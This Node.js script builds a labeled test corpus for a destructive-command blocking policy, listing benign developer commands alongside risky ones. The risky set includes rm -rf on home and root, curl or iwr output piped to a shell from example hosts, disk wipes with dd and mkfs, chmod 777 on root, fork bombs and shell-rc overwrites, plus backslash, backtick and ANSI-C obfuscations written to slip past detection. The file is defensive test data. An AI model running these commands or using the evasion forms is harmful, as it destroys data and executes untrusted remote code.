#!/usr/bin/env node
'use strict';

// Builds test/fixtures/destructive_commands.json: labeled command strings that test the optional
// destructive-command policy (lib/destructive.js and zn_gate/destructive.py).
//
//   benign   ordinary developer commands: the policy must allow every one (each block is a false positive)
//   risky    the command shapes the policy exists for, with varied arguments (each allow is a miss)
//   not_covered  shapes the policy deliberately does not read; it allows them, and the docs say so
//
// The strings are test data for a classifier: they are never run. Hosts are reserved names
// (example.com, .test, .invalid) and documentation addresses (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
// The output is deterministic: run `node test/fixtures/make_destructive_corpus.js` to rewrite it.

const fs = require('fs');
const path = require('path');

// A small fixed-seed generator, so "random" variation is the same on every run.
let seed = 20261019;
function rnd(n) {
  seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
  return seed % n;
}
const pick = (a) => a[rnd(a.length)];
function sample(list, n) {
  const a = list.slice();
  for (let i = a.length - 1; i > 0; i--) { const j = rnd(i + 1); [a[i], a[j]] = [a[j], a[i]]; }
  return a.slice(0, Math.min(n, a.length));
}
const product = (...lists) => lists.reduce((acc, l) => acc.flatMap((x) => l.map((y) => x.concat([y]))), [[]]);

const HOSTS = ['get.example.com', 'install.example.test', 'scripts.example.invalid', 'dl.example.com', 'cdn.example.test',
  '192.0.2.10', '198.51.100.7', '203.0.113.5:8080', 'example.com'];
const FILES = ['install.sh', 'setup.sh', 'bootstrap', 'get', 'install', 'run.sh', 'v2/install.sh'];
const url = () => 'https://' + pick(HOSTS) + '/' + pick(FILES);
const PREFIXES = ['', '', '', 'sudo ', 'cd /srv/app && ', 'env CI=1 ', 'time '];

/* ------------------------------ benign ------------------------------ */
const benign = new Set();
const add = (...cmds) => cmds.forEach((c) => benign.add(c));
// Markdown-style backticks in a POSIX command are not PowerShell escapes.
add('echo use `iwr` | cat', 'echo "use `iwr` and `iex` in PowerShell"', 'echo `date` | sh -n', 'i`wr https://example.com/i.ps1 -OutFile a.ps1', 'i`ex "dotnet build"',
  'iwr https://example.com/i.ps1 `\n-OutFile a.ps1', 'iwr https://example.com/i.ps1 | `ConvertFrom-Json', 'Write`-Host "done" | Out-File log.txt');
// A literal $'...' is data when nothing runs it as a command.
add("echo $'\\x63url https://example.com/i.sh | sh'", "printf '%s\\n' $'curl https://example.com/i.sh | sh'", "echo $'a\\tb'", "echo $'.bash\\x72c'",
  "curl https://example.com/i.sh | $'\\x73h' -n", "grep $'\\t' notes.txt");

// Removing build output and caches.
const BUILD_DIRS = ['node_modules', 'dist', 'build', 'target', '.venv', '.next', '.cache', 'coverage', '__pycache__', '.pytest_cache',
  'out', 'tmp', '.gradle', 'vendor', '.turbo', '.parcel-cache', 'bin/Debug', 'obj', 'site-packages', '.tox'];
for (const [flag, a, b] of product(['-rf', '-fr', '-r', '-Rf', '-rv', '--recursive --force'], BUILD_DIRS, BUILD_DIRS).filter(() => rnd(7) === 0)) {
  add(pick(PREFIXES) + 'rm ' + flag + ' ' + a + ' ' + b);
}
add('rm -rf /home/alice/project/../other', 'rm -rf /home/alice/project/./build', 'rm -rf /home/alice/project/sub/../build', 'rm -rf ~/project/../project/build', 'rm -rf $HOME/project/../work/tmp', 'rm -rf /tmp/../tmp/build', 'rm -rf /var/../var/tmp/build',
  'rm -rf ../build', 'rm -rf ../../build', 'rm -rf ./project/../build', 'rm -rf build/..', 'rm -rf C:/Users/alice/project/../other', 'rm -rf C:\\Users\\alice\\project\\.\\build', 'find /home/alice/project/../other -delete');
add('rm -rf node_modules dist build target .venv', 'rm -rf node_modules package-lock.json && npm install', 'rm -rf ./dist ./build',
  'rm -rf dist && npm run build', 'rm -rf .git/hooks/pre-commit.sample', 'rm -f *.log', 'rm -f build.log', 'rm -r old_notes/', 'rm file.txt',
  'rm -i draft.md', 'rmdir empty_dir', 'rm -rf "$BUILD_DIR"', 'rm -rf $WORKDIR/out', 'rm -rf "${TMPDIR:-/tmp}/zn-test"');
const NEAR = ['~/projects/old-app', '~/Downloads/archive', '~/.cache/pip', '~/.npm/_cacache', '$HOME/.cache/yarn', '"$HOME/.local/share/Trash"',
  '${HOME}/tmp/scratch', '~/Library/Caches/com.example.app', '/tmp/build-4821', '/tmp/*', '/var/tmp/zn', '/var/lib/apt/lists/*', '/var/cache/apk/*',
  '/usr/local/lib/node_modules/example-pkg', '/home/runner/work/_temp', '/opt/app/releases/20261001', '/srv/www/old-site', './out', '../tmp',
  '/usr/share/doc/example', '/etc/apt/sources.list.d/example.list', '/home/alice/projects/app/build', '/Users/bob/Library/Developer/Xcode/DerivedData',
  '/mnt/data/cache', '/root/.cache/pip', '~/go/pkg/mod/cache', '~/.gradle/caches', '$HOME/.m2/repository/org/example'];
for (const t of NEAR) for (const flag of sample(['-rf', '-fr', '-r', '--recursive --force'], 2)) add(pick(['', 'sudo ', '']) + 'rm ' + flag + ' ' + t);
add('find . -name "*.pyc" -delete', 'find . -name node_modules -type d -prune -exec rm -rf {} +', 'find ~/projects -name .DS_Store -delete',
  'find /tmp -mtime +7 -delete', 'find / -name "*.orig" -type f 2>/dev/null', 'find ~ -name "*.bak" -mtime +30 -delete', 'find . -type f -empty -delete',
  'find /var/log -name "*.gz" -mtime +14 -delete', 'find . -name "*.tmp" | xargs rm', 'find ~/Downloads -type f -name "*.iso"');

// git.
const BRANCHES = ['main', 'next', 'develop', 'feat/login', 'fix/null-check', 'release/1.4', 'chore/deps'];
for (const b of BRANCHES) add('git checkout ' + b, 'git switch -c ' + b, 'git push origin ' + b, 'git pull --rebase origin ' + b, 'git merge --no-ff ' + b,
  'git branch -d ' + b, 'git log --oneline origin/' + b + '..HEAD', 'git diff ' + b + '...HEAD --stat');
add('git status', 'git add -A && git commit -m "wip"', 'git commit -m "docs: warn that curl | sh installs are unsafe"',
  'git commit -m "remove rm -rf ~ from the cleanup script"', 'git stash push -m "before rebase"', 'git clean -fdx -n', 'git clean -fd', 'git reset --hard HEAD~1',
  'git restore --staged .', 'git tag -a v1.2.3 -m "release"', 'git remote -v', 'git fetch --all --prune', 'git rebase -i HEAD~3'.replace('-i ', ''),
  'git log -p -- README.md', 'git blame src/index.js', 'git bisect start', 'git submodule update --init --recursive', 'git worktree add ../wt-fix fix/x');

// Package managers and build tools.
for (const pkg of ['express', 'react', 'left-pad', 'typescript', '@types/node', 'zod']) add('npm install ' + pkg, 'npm install --save-dev ' + pkg, 'npm uninstall ' + pkg, 'pnpm add ' + pkg, 'yarn add ' + pkg);
for (const pkg of ['requests', 'numpy', 'pytest', 'black', 'fastapi']) add('pip install ' + pkg, 'pip install -U ' + pkg, 'python -m pip install ' + pkg + ' --user', 'pip uninstall -y ' + pkg, 'uv pip install ' + pkg);
add('npm ci', 'npm test', 'npm run build', 'npm run lint -- --fix', 'npx tsc --noEmit', 'npm publish --dry-run', 'npm audit', 'npm run dev', 'node --test', 'node index.js',
  'yarn install --frozen-lockfile', 'pnpm -r build', 'pip install -r requirements.txt', 'python -m venv .venv', 'source .venv/bin/activate', 'pytest -q tests/', 'python -m pytest -x',
  'ruff check .', 'mypy src', 'poetry install', 'cargo build --release', 'cargo test', 'cargo clippy -- -D warnings', 'cargo fmt --check', 'go build ./...', 'go test ./... -race',
  'go mod tidy', 'mvn -q clean package', 'gradle build -x test', './gradlew assemble', 'dotnet build -c Release', 'dotnet test', 'make', 'make clean', 'make -j4 all', 'cmake -B build -S .',
  'cmake --build build', 'bundle install', 'rake test', 'composer install', 'swift build', 'flutter pub get', 'tsc -p tsconfig.json', 'eslint src --ext .ts', 'prettier --check .');

// Containers, cloud, infrastructure.
for (const img of ['node:20', 'python:3.12-slim', 'postgres:16', 'redis:7', 'nginx:alpine']) add('docker pull ' + img, 'docker run --rm -it ' + img + ' sh', 'docker run -d -p 8080:80 ' + img, 'docker rmi ' + img);
add('docker build -t app:dev .', 'docker compose up -d', 'docker compose down -v', 'docker ps -a', 'docker logs -f web', 'docker exec -it web sh -c "rm -rf /app/cache"',
  'docker exec db psql -U postgres -c "select 1"', 'docker system prune -f', 'docker run --rm -v "$PWD":/work alpine rm -rf /work/tmp', 'kubectl get pods -n staging', 'kubectl apply -f deploy.yaml',
  'kubectl delete pod web-1 -n staging', 'kubectl logs deploy/api --tail=100', 'terraform plan', 'terraform apply -auto-approve', 'aws s3 ls s3://example-bucket/', 'aws s3 cp build/ s3://example-bucket/ --recursive',
  'aws sts get-caller-identity', 'gcloud compute instances list', 'az group list', 'helm upgrade --install app ./chart', 'ssh deploy@203.0.113.5 "systemctl restart app"', 'scp dist.tar.gz deploy@198.51.100.7:/srv/app/');

// Downloads that are fine.
for (let i = 0; i < 30; i++) {
  const u = url();
  const f = pick(['archive.tar.gz', 'tool.zip', 'data.json', 'install.sh', 'release.tgz']);
  add(pick(['curl -fsSL ', 'curl -sSL ', 'curl -L ', 'curl -s ']) + u + ' -o ' + f);
  add(pick(['wget -q ', 'wget ', 'wget -nv ']) + u + ' -O ' + f);
}
for (const h of HOSTS) {
  const u = 'https://' + h + '/api/status';
  add('curl -s ' + u + ' | jq .', 'curl -s ' + u + ' | jq -r .version', 'curl ' + u + ' | python3 -m json.tool', 'curl -s ' + u + ' | grep ok', 'curl -sI ' + u + ' | head -1',
    'curl -fsSL https://' + h + '/pkg.tar.gz | tar xz -C /tmp/pkg', 'wget -qO- https://' + h + '/pkg.tar.gz | tar -xz', 'curl -fsSL https://' + h + '/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg',
    'curl -fsSL https://' + h + '/repo.list | sudo tee /etc/apt/sources.list.d/example.list', 'curl -X POST -H "Content-Type: application/json" -d \'{"a":1}\' ' + u, 'curl -fsSL https://' + h + '/install.sh | sh -n',
    'curl -fsSL https://' + h + '/install.sh | shellcheck -', 'curl -fsSL https://' + h + '/install.sh | less', 'curl -fsSL https://' + h + '/install.sh | sha256sum', 'curl -s ' + u + ' > status.json',
    'curl --fail ' + u + ' 2>&1 | tee check.log', 'wget --spider ' + u);
}
add('curl -fsSL https://get.example.com/install.sh -o install.sh && less install.sh', 'curl -o ./config.json https://example.com/config.json', 'curl -fsSL https://example.com/a -o ~/.config/app/config.toml',
  'curl https://example.com/ | wc -c', 'wget https://example.com/file.zip && unzip file.zip', 'curl -fsSL https://example.com/x.sh > x.sh && shellcheck x.sh', 'curl ifconfig.me');

// Shell startup files, edited the usual ways.
add('echo \'export PATH="$HOME/bin:$PATH"\' >> ~/.bashrc', 'echo "alias ll=\'ls -la\'" >> ~/.zshrc', 'cat ~/.bashrc', 'source ~/.zshrc', '. ~/.bashrc', 'cp ~/.bashrc ~/.bashrc.bak',
  'grep -n alias ~/.bashrc', 'sed -i \'s/old/new/\' ~/.zshrc', 'code ~/.zshrc', 'vim ~/.bash_profile', 'diff ~/.bashrc ~/dotfiles/bashrc', 'ln -sf ~/dotfiles/zshrc ~/.zshrc', 'cp dotfiles/.zshrc ~/.zshrc',
  'tail -5 ~/.profile', 'echo "set -o vi" | tee -a ~/.bashrc', 'printf "export EDITOR=vim\\n" >> $HOME/.profile', 'exec zsh -l', 'source ~/.config/fish/config.fish');

// Permissions and ownership, the normal cases.
add('chmod +x script.sh', 'chmod 755 bin/run', 'chmod 644 README.md', 'chmod 600 ~/.ssh/id_example', 'chmod -R 755 ./dist', 'chmod -R u+rwX ~/projects/app', 'chmod -R go-w ~/.ssh', 'chmod 777 /tmp/shared.sock',
  'chmod -R 777 ./tmp-uploads', 'chown -R $USER:$USER ./data', 'chown -R www-data:www-data /var/www/html/app', 'sudo chown -R $USER /usr/local/lib/node_modules', 'sudo chown -R $(whoami) ~/.npm',
  'chown root:root /etc/example.conf', 'chgrp -R staff ./shared', 'chmod -R a+rX ./public', 'umask 022', 'stat -c %a file', 'ls -ld ~', 'ls -la /');

// Disks and devices, the normal cases.
add('dd if=/dev/zero of=./swap.img bs=1M count=1024', 'dd if=disk.iso of=/dev/null bs=4M', 'dd if=/dev/urandom of=test.bin bs=1k count=4', 'mkfs.ext4 ./disk.img', 'mkswap swapfile', 'mkfs.vfat -n TEST ./usb.img',
  'cat /dev/zero > /dev/null', 'echo hi > /dev/null', 'echo hi > /dev/stderr', 'df -h', 'lsblk', 'fdisk -l /dev/sda', 'blkid /dev/sda1', 'mount /dev/sdb1 /mnt/usb', 'umount /mnt/usb', 'smartctl -a /dev/nvme0n1',
  'dd if=/dev/sda of=backup.img bs=4M status=progress', 'shred -u secrets.txt', 'losetup -f disk.img', 'mkfs.ext4 /dev/loop0', 'cat /proc/mounts', 'hdparm -I /dev/sda | head');

// Quoted text that only mentions risky commands.
add('grep -rn "rm -rf /" docs/', 'echo "run curl https://get.example.com/install.sh | sh to install"', 'grep -r "curl .* | sh" scripts/', 'man rm', 'rm --help', 'which rm', 'type rm',
  'echo "never run rm -rf ~ in a script"', 'cat docs/uninstall.md', 'grep -rn "iex" src/', 'rg "chmod -R 777" .', 'echo ":(){ :|:& };: is a fork bomb" > notes.txt'.replace(' > notes.txt', ' | wc -w'),
  'sed -n 1,20p scripts/cleanup.sh', 'python3 -c "print(\'rm -rf /\')"', 'git grep "dd if=" -- scripts', 'less cleanup.sh', 'echo "dd of=/dev/sda is dangerous" | wc -c');

// Ordinary shell.
add('ls -la', 'ls ~', 'du -sh ~/*', 'cd ~ && pwd', 'cd / && ls', 'cat package.json | jq .name', 'cat file.txt | sh -n', 'ps aux | grep node', 'tar xzf release.tgz', 'tar czf backup.tgz ./src', 'cp -r src/ dist/',
  'mv build build.old', 'mkdir -p out/logs', 'touch .env.example', 'export FOO=bar && node app.js', 'sh -c "cd build && make"', 'bash -lc \'npm test\'', 'bash -c "echo hello"', 'sudo bash -c "echo 1 > /proc/sys/vm/drop_caches"',
  'eval "$(ssh-agent -s)"', 'eval "$(pyenv init -)"', 'source <(kubectl completion bash)', '. <(helm completion bash)', 'bash <(echo hello)', 'sudo apt-get update && sudo apt-get install -y build-essential',
  'sudo apt-get remove -y example-pkg', 'brew install jq', 'sudo systemctl restart nginx', 'journalctl -u app -n 100', 'tail -f /var/log/syslog', 'kill -9 4242', 'pkill -f node', 'xargs -a files.txt cat',
  'sleep 2 && echo done', 'time npm test', 'nohup node server.js &', 'timeout 30 npm test', 'env NODE_ENV=production node app.js', 'sudo -u postgres psql -c "select 1"', 'watch -n 5 df -h', 'crontab -l',
  'sort data.csv | uniq -c | sort -rn | head', 'awk \'{print $1}\' access.log | sort | uniq', 'sed -i.bak "s/foo/bar/g" src/*.js', 'diff -u a.txt b.txt', 'openssl rand -hex 16', 'ping -c 3 192.0.2.1', 'nc -zv 198.51.100.7 22',
  'nslookup example.com', 'curl -I https://example.com', 'whoami', 'uname -a', 'echo $HOME', 'echo ~', 'ls ~/.ssh', 'cd "$HOME/projects" && ls', 'true || rm -rf node_modules', 'test -d ~/projects || mkdir ~/projects');

// More commands that sit close to the risky shapes.
add('curl -fsSL https://get.example.com/install.sh | bash -n', 'sudo rm -rf /var/lib/docker/overlay2/abc123', 'rm -rf /home/runner/work/_temp/*', 'rm -rf /tmp', 'rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.linux-amd64.tar.gz',
  'rm -rf /Library/Developer/CommandLineTools', 'rm -rf /home/$USER/.cache/pip', 'chmod -R 755 /var/www/html', 'chown -R www-data /var/www', 'cat install.sh | sh', 'cat local-script.sh | bash -s -- --dry-run',
  'dd if=/dev/zero of=/dev/null bs=1M count=10', 'dd if=/dev/zero of=/dev/stdout bs=1 count=1', 'echo test > /dev/tty', 'mkfs.ext4 -F ./test-disk.img', 'wget -qO- https://example.com/data.json | jq .items',
  'docker run --rm alpine sh -c "rm -rf /tmp/*"', 'sudo rm -rf /opt/example-app/old', 'sudo rm -rf /usr/lib/example', 'rm -rf $HOME/.config/example-app', 'rm -rf "$HOME/Library/Application Support/Example"',
  'chmod -R 777 build/tmp', 'ls /home', 'ls /Users', 'cd /home/alice && ls', 'cat /etc/hosts', 'cp /etc/hosts ~/hosts.bak', 'tar czf ~/backup.tgz ~/projects');

// Backslashes in words (bash drops them), Windows paths that keep them.
add('echo cu\\rl', 'echo s\\h', 'curl https://example.com/i.sh | s\\h -n', 'curl -o C:\\Users\\example\\tool.exe https://example.com/tool.exe', 'C:\\Users\\example\\tool.exe --version',
  'C:\\Users\\example\\tool.exe https://example.com/x | C:\\Windows\\System32\\findstr.exe x', 'type C:\\Users\\example\\src\\run.sh',
  'rm -rf C:\\Users\\me\\tmp', 'rd /s /q C:\\work\\build', 'Remove-Item C:\\Users\\me\\AppData\\Local\\Temp\\zn -Recurse', 'rm -rf .\\build', 'del /s /q C:\\tmp\\*');

// PowerShell and cmd.
add('Remove-Item -Recurse -Force .\\node_modules', 'Remove-Item -Recurse -Force .\\dist, .\\build', 'Remove-Item -Recurse -Force $env:TEMP\\build-4821', 'Remove-Item -Force old.log', 'Remove-Item C:\\Users\\alice\\AppData\\Local\\Temp\\zn -Recurse',
  'rm -r -fo node_modules', 'ri .\\out -Recurse -Force', 'rd /s /q build', 'rd /s /q node_modules', 'del /q *.tmp', 'del /s /q .\\dist\\*.map', 'rmdir /s /q C:\\work\\app\\build',
  'Invoke-WebRequest https://example.com/a.zip -OutFile a.zip', 'iwr https://example.com/a.zip -OutFile $env:TEMP\\a.zip', 'irm https://example.com/api/status | ConvertFrom-Json', 'Invoke-RestMethod https://example.com/api | Select-Object -First 1',
  'Invoke-WebRequest https://example.com | Select-Object -ExpandProperty StatusCode', 'Get-Content $PROFILE', 'Add-Content $PROFILE \'Set-Alias ll Get-ChildItem\'', 'notepad $PROFILE', 'Get-ChildItem -Recurse -Filter *.log',
  'Get-Process node | Stop-Process', 'Set-Location $HOME', 'Copy-Item .\\a.txt $HOME\\Documents\\', 'iex "dotnet build"', 'Invoke-Expression $command', 'powershell -Command "Get-Date"', 'pwsh -c "dotnet test"',
  'cmd /c dir', 'cmd /c "rd /s /q build"', 'dir C:\\', 'icacls C:\\work\\app /grant Users:F /T', 'Get-Disk', 'Get-Volume', 'Format-Table -AutoSize', 'Expand-Archive a.zip -DestinationPath out', 'npm.cmd install');

/* ------------------------------ risky ------------------------------ */
const risky = [];
const seen = new Set();
const addRisk = (rule, cmd) => { if (!seen.has(cmd)) { seen.add(cmd); risky.push({ cmd, rule }); } };

// rm_root_home
const RM_FLAGS = ['-rf', '-fr', '-Rf', '-r -f', '-rfv', '-rf --no-preserve-root', '--recursive --force', '-r', '-Rv', '-rf --'];
const RM_TARGETS = ['~', '~/', '~/*', '$HOME', '"$HOME"', '${HOME}', '$HOME/', '$HOME/*', '/', '/*', '/usr', '/etc', '/var/*', '/home', '/home/alice', '/Users/bob', '/root', '/bin', '/boot', '/System', '/Library', '/opt'];
for (const [fl, t, p] of sample(product(RM_FLAGS, RM_TARGETS, PREFIXES), 70)) addRisk('rm_root_home', p + 'rm ' + fl + ' ' + t);
for (const t of ['~', '/', '$HOME', '/etc', '~/*', '/home/alice']) {
  addRisk('rm_root_home', 'sh -c "rm -rf ' + t + '"');
  addRisk('rm_root_home', "bash -lc 'rm -rf " + t + "'");
  addRisk('rm_root_home', 'cd /tmp && rm -rf ' + t);
  addRisk('rm_root_home', 'true && sudo rm -rf ' + t + ' ; echo done');
  addRisk('rm_root_home', 'rm -rf ' + t + ' 2>/dev/null');
  addRisk('rm_root_home', 'find ' + t + ' -delete');
  addRisk('rm_root_home', 'find ' + t + ' -exec rm -rf {} +');
}
addRisk('rm_root_home', 'rm -rf node_modules ~');
// "." and ".." segments that resolve to the home folder or the root (lexically; example paths only).
for (const t of ['/home/alice/..', '/home/alice/../..', '/home/alice/project/../..', '/home/alice/./project/../', '/Users/bob/project/..', '/usr/..', '/usr/../*', '/etc/../etc/..', '/..', '/../..', '/home/../', '/tmp/../',
  '~/project/..', '~/./', '~/..', '$HOME/project/..', '"$HOME/project/.."', '${HOME}/a/b/../..', '$HOME/../alice', '//home//alice//project//..', 'C:/Users/alice/project/..', 'C:/Users/alice/..', 'C:/..', 'C:\\Users\\alice\\project\\..']) {
  addRisk('rm_root_home', 'rm -rf ' + t);
}
addRisk('rm_root_home', 'sudo rm -rf /home/alice/project/../..');
addRisk('rm_root_home', 'find /home/alice/project/.. -delete');
addRisk('rm_root_home', 'Remove-Item -Recurse -Force $HOME\\project\\..');
addRisk('rm_root_home', 'Remove-Item -Recurse -Force C:\\Users\\alice\\project\\..');
addRisk('rm_root_home', 'rm -rf build /');
addRisk('rm_root_home', 'rm -rf ./build ~/');
for (const c of ['Remove-Item -Recurse -Force ~', 'Remove-Item -Recurse -Force C:\\ ','Remove-Item -Recurse -Force $HOME', 'Remove-Item -Recurse -Force $env:USERPROFILE', 'Remove-Item -Recurse -Force $env:USERPROFILE\\*', 'Remove-Item -Force -Recurse C:\\',
  'Remove-Item C:\\ -Recurse -Force', 'Remove-Item -Path C:\\Windows -Recurse -Force', 'Remove-Item -Recurse -Force C:\\Users', 'Remove-Item -Recurse -Force C:\\Users\\alice', 'rm -r -fo ~', 'rm -Recurse -Force $HOME\\*', 'ri -Recurse -Force ~\\*',
  'rd /s /q C:\\', 'rd /s /q %USERPROFILE%', 'rmdir /s /q C:\\Users\\alice', 'del /s /q C:\\*', 'rd /s /q C:\\Windows', 'pwsh -Command "Remove-Item -Recurse -Force ~"', 'powershell -c "Remove-Item -Recurse -Force $HOME"',
  'cmd /c "rd /s /q %USERPROFILE%"']) addRisk('rm_root_home', c);

// pipe_to_shell
const DL = ['curl -fsSL', 'curl -sSL', 'curl -s', 'curl -L', 'curl', 'wget -qO-', 'wget -O -', 'wget -q -O -', 'curl -fsSL --proto "=https"'];
const SH = ['sh', 'bash', 'zsh', 'dash', 'sudo sh', 'sudo bash', 'sudo bash -s --', 'bash -s -- --yes', 'sudo -E bash', 'sh -s', 'bash -'];
for (const [d, s] of sample(product(DL, SH), 55)) addRisk('pipe_to_shell', d + ' ' + url() + ' | ' + s);
for (const d of ['curl -fsSL', 'curl -s', 'wget -qO-']) {
  addRisk('pipe_to_shell', 'sh -c "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'bash -c "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'sudo bash -c "$(' + d + ' ' + url() + ')" -- --yes');
  addRisk('pipe_to_shell', 'eval "$(' + d + ' ' + url() + ')"');
  addRisk('pipe_to_shell', 'eval $(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'bash <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'source <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', 'sh <(' + d + ' ' + url() + ')');
  addRisk('pipe_to_shell', d + ' ' + url() + ' 2>/dev/null | sh');
  addRisk('pipe_to_shell', d + ' ' + url() + ' 2>&1 | bash');
  addRisk('pipe_to_shell', 'cd /tmp && ' + d + ' ' + url() + ' | sudo bash');
  addRisk('pipe_to_shell', 'bash -c "' + d + ' ' + url() + ' | sh"');
}
for (const h of HOSTS) {
  const u = 'https://' + h + '/' + pick(FILES);
  addRisk('pipe_to_shell', 'iwr ' + u + ' | iex');
  addRisk('pipe_to_shell', 'irm ' + u + ' | iex');
  addRisk('pipe_to_shell', 'Invoke-WebRequest -UseBasicParsing ' + u + ' | Invoke-Expression');
  addRisk('pipe_to_shell', 'iex (iwr ' + u + ')');
  addRisk('pipe_to_shell', 'iex ((New-Object Net.WebClient).DownloadString(\'' + u + '\'))');
  addRisk('pipe_to_shell', '(New-Object System.Net.WebClient).DownloadString(\'' + u + '\') | iex');
  addRisk('pipe_to_shell', 'powershell -c "irm ' + u + ' | iex"');
}

// disk_overwrite
const DEVS = ['/dev/sda', '/dev/sdb1', '/dev/nvme0n1', '/dev/nvme1n1p2', '/dev/disk2', '/dev/mmcblk0', '/dev/vda', '/dev/xvda', '/dev/hda', '/dev/mapper/vg0-root', '/dev/md0'];
for (const dev of DEVS) {
  addRisk('disk_overwrite', pick(['', 'sudo ']) + 'dd if=/dev/zero of=' + dev + ' bs=1M');
  addRisk('disk_overwrite', 'dd if=/dev/urandom of=' + dev + ' bs=4M status=progress');
  addRisk('disk_overwrite', 'sudo dd if=image.iso of=' + dev + ' bs=4M conv=fsync');
  addRisk('disk_overwrite', pick(['', 'sudo ']) + pick(['mkfs.ext4', 'mkfs.xfs', 'mkfs.vfat', 'mkfs -t ext4', 'mke2fs', 'mkswap']) + ' ' + dev);
  addRisk('disk_overwrite', 'cat /dev/zero > ' + dev);
  addRisk('disk_overwrite', 'echo x > ' + dev);
}
for (const c of ['wipefs -a /dev/sdc', 'sudo wipefs --all /dev/nvme0n1', 'shred -n1 -z /dev/sda', 'blkdiscard /dev/nvme0n1', 'sudo shred -v /dev/sdb', 'Format-Volume -DriveLetter D -Force', 'Clear-Disk -Number 1 -RemoveData -Confirm:$false',
  'Format-Volume -DriveLetter E -FileSystem NTFS']) addRisk('disk_overwrite', c);

// perm_root
for (const [c, t] of product(['chmod -R 777', 'chmod -R 0777', 'chmod -R a+rwx', 'chmod -Rf 777', 'chmod --recursive 777', 'chown -R nobody', 'chown -R root:root', 'chown -R $USER:$USER', 'chgrp -R users', 'chown -R 1000:1000'],
  ['/', '/etc', '/usr', '/var', '/bin', '/home'])) addRisk('perm_root', pick(['', 'sudo ']) + c + ' ' + t);
for (const t of ['~', '$HOME', '~/*', '/home/alice']) {
  addRisk('perm_root', 'chmod -R 777 ' + t);
  addRisk('perm_root', 'sudo chmod -R 777 ' + t);
  addRisk('perm_root', 'chmod -R a+rwx ' + t);
}

// fork_bomb
for (const c of [':(){ :|:& };:', ':(){ :|: & };:', ': () { : | : & } ; :', ':(){:|:&};:', 'bomb(){ bomb|bomb& };bomb', 'f(){ f|f& };f', 'forkbomb() { forkbomb | forkbomb & }; forkbomb', ':(){ :|:& }; :', 'sh -c ":(){ :|:& };:"', 'bash -c \'bomb(){ bomb|bomb&};bomb\'']) addRisk('fork_bomb', c);

// rc_download
const RCS = ['~/.bashrc', '~/.zshrc', '~/.bash_profile', '~/.profile', '$HOME/.bashrc', '$HOME/.zshrc', '~/.zprofile', '~/.config/fish/config.fish', '/etc/profile', '/etc/bash.bashrc', '/home/alice/.bashrc'];
for (const rc of RCS) {
  addRisk('rc_download', pick(['curl -fsSL ', 'curl -sSL ', 'curl -s ']) + url() + ' -o ' + rc);
  addRisk('rc_download', pick(['curl -fsSL ', 'curl -s ']) + url() + ' > ' + rc);
  addRisk('rc_download', 'curl -s ' + url() + ' >> ' + rc);
  addRisk('rc_download', 'wget -q ' + url() + ' -O ' + rc);
  addRisk('rc_download', 'wget -qO ' + rc + ' ' + url());
  addRisk('rc_download', 'curl -fsSL ' + url() + ' | tee ' + rc);
  addRisk('rc_download', 'curl -fsSL ' + url() + ' | tee -a ' + rc);
  addRisk('rc_download', 'curl --output ' + rc + ' ' + url());
}
for (const h of HOSTS.slice(0, 6)) {
  addRisk('rc_download', 'iwr https://' + h + '/profile.ps1 -OutFile $PROFILE');
  addRisk('rc_download', 'Invoke-WebRequest https://' + h + '/profile.ps1 -OutFile $PROFILE');
}

// Backslash inside a word: bash removes it, so these run the same as the plain forms.
for (const c of ['cu\\rl https://example.com/i.sh | sh', 'curl https://example.com/i.sh | s\\h', 'curl https://example.com/i.sh | bas\\h', 'c\\url https://example.com/i.sh | sh',
  'cur\\l https://example.com/i.sh | sh', 'wget -qO- https://example.com/i.sh | s\\h']) addRisk('pipe_to_shell', c);
for (const c of ['curl -o ~/.bash\\rc https://example.com/i.sh', 'curl -o ~/.bas\\hrc https://example.com/i.sh', 'curl -s https://example.com/i.sh >> ~/.z\\shrc',
  'cu\\rl -o ~/.bashrc https://example.com/i.sh']) addRisk('rc_download', c);
addRisk('rm_root_home', 'r\\m -rf ~');
addRisk('rm_root_home', 'rm -r\\f /');
addRisk('disk_overwrite', 'd\\d if=/dev/zero of=/dev/sda');

// PowerShell backtick escapes: i`wr is iwr.
for (const c of ['i`wr https://example.com/i.ps1 | i`ex', 'iw`r https://example.com/i.ps1 | iex', 'Invoke-`WebRequest https://example.com/i.ps1 | Invoke-`Expression',
  'i`ex (i`wr https://example.com/i.ps1)', 'pwsh -c "i`wr https://example.com/i.ps1 | i`ex"',
  'iwr https://example.com/i.ps1 `\n| iex', 'iwr https://example.com/i.ps1 |`\niex', 'iex `\n(iwr https://example.com/i.ps1)',
  'iwr https://example.com/i.ps1 | `iex', 'iwr https://example.com/i.ps1 | invoke`-expression']) addRisk('pipe_to_shell', c);

// PowerShell 7: a next line that starts with a pipe continues the pipeline.
for (const c of ['iwr https://example.com/i.ps1\n| iex', 'iwr https://example.com/i.ps1\r\n| iex', 'iwr https://example.com/i.ps1\n    | iex',
  'iwr https://example.com/i.ps1\n\t| Invoke-Expression', 'Invoke-WebRequest https://example.com/i.ps1\n| i`ex']) addRisk('pipe_to_shell', c);
add('iwr https://example.com/i.ps1\n| ConvertFrom-Json', 'iwr https://example.com/i.ps1\r\n  | ConvertFrom-Json | Select-Object name', 'curl https://example.com/i.sh\n| jq .',
  'iwr https://example.com/i.ps1 -OutFile a.ps1\n| Out-Null');

// ANSI-C quoting: bash decodes $'...' before it runs the word.
for (const c of ["$'\\x63url' -fsSL https://example.com/i.sh | $'\\x73h'", "$'\\143url' https://example.com/i.sh | sh", "curl https://example.com/i.sh | $'\\x62ash' -s",
  "$'c\\x75rl' https://example.com/i.sh | sh", "$'\\u0063url' https://example.com/i.sh | sh", "wget -qO- https://example.com/i.sh | $'s\\150'",
  "bash -c $'curl https://example.com/i.sh | sh'"]) addRisk('pipe_to_shell', c);
for (const c of ["curl -o ~/$'.bash\\x72c' https://example.com/i.sh", "curl -s https://example.com/i.sh >> ~/.$'z\\x73hrc'", "$'\\x63url' -o ~/.bashrc https://example.com/i.sh",
  "curl https://example.com/i.sh | tee -a ~/$'.\\x70rofile'"]) addRisk('rc_download', c);
